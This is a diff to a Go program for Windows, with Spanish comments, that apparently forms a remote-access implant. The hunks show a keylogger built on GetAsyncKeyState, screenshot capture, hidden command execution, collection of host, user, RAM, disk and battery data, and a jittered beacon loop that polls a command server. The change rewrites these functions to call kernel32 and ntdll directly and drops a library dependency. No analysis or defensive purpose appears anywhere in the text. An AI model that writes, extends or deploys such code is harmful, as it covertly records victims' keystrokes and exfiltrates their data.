@@ -26,7 +26,6 @@ import (
 
 	"github.com/kbinani/screenshot"
 	"golang.org/x/image/draw"
-	"golang.org/x/sys/windows"
 )
 
 const (
@@ -67,7 +66,45 @@ var (
 	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
 	procGetForeground    = user32.NewProc("GetForegroundWindow")
 	procGetWindowText    = user32.NewProc("GetWindowTextW")
+
+	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
+	procGlobalMemoryStatusEx = kernel32.NewProc("GlobalMemoryStatusEx")
+	procGetDiskFreeSpaceEx   = kernel32.NewProc("GetDiskFreeSpaceExW")
+	procGetSystemPowerStatus = kernel32.NewProc("GetSystemPowerStatus")
+
+	ntdll             = syscall.NewLazyDLL("ntdll.dll")
+	procRtlGetVersion = ntdll.NewProc("RtlGetVersion")
 )
+
+type memoryStatusEx struct {
+	Length               uint32
+	MemoryLoad           uint32
+	TotalPhys            uint64
+	AvailPhys            uint64
+	TotalPageFile        uint64
+	AvailPageFile        uint64
+	TotalVirtual         uint64
+	AvailVirtual         uint64
+	AvailExtendedVirtual uint64
+}
+
+type systemPowerStatus struct {
+	ACLineStatus        byte
+	BatteryFlag         byte
+	BatteryLifePercent  byte
+	SystemStatusFlag    byte
+	BatteryLifeTime     uint32
+	BatteryFullLifeTime uint32
+}
+
+type osVersionInfoEx struct {
+	OSVersionInfoSize uint32
+	MajorVersion      uint32
+	MinorVersion      uint32
+	BuildNumber       uint32
+	PlatformId        uint32
+	CSDVersion        [128]uint16
+}
 
 /* ---------------- utilidades ---------------- */
 
@@ -116,12 +153,53 @@ func f64(v any) float64 {
 func hostname() string { h, _ := os.Hostname(); return h }
 
 func osVersion() string {
-	v := windows.RtlGetVersion()
+	var v osVersionInfoEx
+	v.OSVersionInfoSize = uint32(unsafe.Sizeof(v))
+	procRtlGetVersion.Call(uintptr(unsafe.Pointer(&v)))
 	return fmt.Sprintf("Windows %d.%d.%d", v.MajorVersion, v.MinorVersion, v.BuildNumber)
 }
 
 func hidden(cmd *exec.Cmd) {
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
+}
+
+func keyDown(vk uintptr) bool {
+	r, _, _ := procGetAsyncKeyState.Call(vk)
+	return uint16(r)&0x8000 != 0
+}
+
+func ramMB() (uint64, uint64) {
+	var m memoryStatusEx
+	m.Length = uint32(unsafe.Sizeof(m))
+	r, _, _ := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&m)))
+	if r == 0 {
+		return 0, 0
+	}
+	return m.TotalPhys / 1048576, m.AvailPhys / 1048576
+}
+
+func diskGB() (uint64, uint64) {
+	var free, total uint64
+	p, err := syscall.UTF16PtrFromString("C:\\")
+	if err != nil {
+		return 0, 0
+	}
+	procGetDiskFreeSpaceEx.Call(uintptr(unsafe.Pointer(p)),
+		uintptr(unsafe.Pointer(&free)), uintptr(unsafe.Pointer(&total)), 0)
+	return free / 1073741824, total / 1073741824
+}
+
+func powerStatus() (int, bool) {
+	var s systemPowerStatus
+	r, _, _ := procGetSystemPowerStatus.Call(uintptr(unsafe.Pointer(&s)))
+	if r == 0 {
+		return 100, true
+	}
+	pct := int(s.BatteryLifePercent)
+	if pct > 100 {
+		pct = 100
+	}
+	return pct, s.ACLineStatus == 1
 }
 
 /* ---------------- estado ---------------- */
@@ -399,13 +477,11 @@ func fileGet(p string) string {
 }
 
 func infoJSON() string {
-	var ms windows.MemoryStatusEx
-	ms.Length = uint32(unsafe.Sizeof(ms))
-	windows.GlobalMemoryStatusEx(&ms)
+	total, free := ramMB()
 	d := map[string]any{
 		"host": hostname(), "user": os.Getenv("USERNAME"), "os": osVersion(),
 		"arch": runtime.GOARCH, "cpus": runtime.NumCPU(),
-		"ram_total_mb": ms.TotalPhys / 1048576, "ram_free_mb": ms.AvailPhys / 1048576,
+		"ram_total_mb": total, "ram_free_mb": free,
 		"device_id": state.DeviceID, "uptime_s": int(time.Since(start).Seconds()),
 	}
 	b, _ := json.Marshal(d)
@@ -413,19 +489,15 @@ func infoJSON() string {
 }
 
 func storageJSON() string {
-	var free, total, totalFree uint64
-	windows.GetDiskFreeSpaceEx("C:\\", &free, &total, &totalFree)
-	d := map[string]any{"unidad": "C:", "libre_gb": free / 1073741824, "total_gb": total / 1073741824}
+	free, total := diskGB()
+	d := map[string]any{"unidad": "C:", "libre_gb": free, "total_gb": total}
 	b, _ := json.Marshal(d)
 	return string(b)
 }
 
 func batteryJSON() string {
-	st, err := windows.GetSystemPowerStatus()
-	if err != nil {
-		return "err:" + err.Error()
-	}
-	d := map[string]any{"pct": st.BatteryLifePercent, "ac": st.ACLineStatus == 1}
+	pct, ac := powerStatus()
+	d := map[string]any{"pct": pct, "ac": ac}
 	b, _ := json.Marshal(d)
 	return string(b)
 }
@@ -518,8 +590,7 @@ func keylogger() {
 	last := time.Now()
 	for range time.NewTicker(20 * time.Millisecond).C {
 		for vk := 0x08; vk <= 0xFE; vk++ {
-			r, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
-			down := int16(r)&0x8000 != 0
+			down := keyDown(uintptr(vk))
 			if down && !prev[vk] {
 				if c := vkToChar(byte(vk)); c != "" {
 					buf.WriteString(c)
@@ -536,16 +607,15 @@ func keylogger() {
 }
 
 func vkToChar(vk byte) string {
-	shift := func() bool { r, _, _ := procGetAsyncKeyState.Call(0x10); return int16(r)&0x8000 != 0 }
 	switch {
 	case vk >= 0x41 && vk <= 0x5A:
 		c := string(rune('a' + vk - 0x41))
-		if shift() {
+		if keyDown(0x10) {
 			c = strings.ToUpper(c)
 		}
 		return c
 	case vk >= 0x30 && vk <= 0x39:
-		if shift() {
+		if keyDown(0x10) {
 			return "!@#$%^&*()"[vk-0x30 : vk-0x30+1]
 		}
 		return string(rune('0' + vk - 0x30))
@@ -624,8 +694,9 @@ func main() {
 	lastPush := time.Now()
 
 	for {
+		pct, ac := powerStatus()
 		m, code, err := call("/api/v1/sync/beacon", map[string]any{
-			"battery": batteryPct(), "charging": true, "net": "wifi", "screen_on": true,
+			"battery": pct, "charging": ac, "net": "wifi", "screen_on": true,
 		}, true)
 
 		if code == 401 {
@@ -672,12 +743,4 @@ func main() {
 		jitter := time.Duration(rand.Intn(1600)-800) * time.Millisecond
 		time.Sleep(time.Duration(pollMs)*time.Millisecond + jitter)
 	}
-}
-
-func batteryPct() int {
-	st, err := windows.GetSystemPowerStatus()
-	if err != nil {
-		return 0
-	}
-	return int(st.BatteryLifePercent)
 }
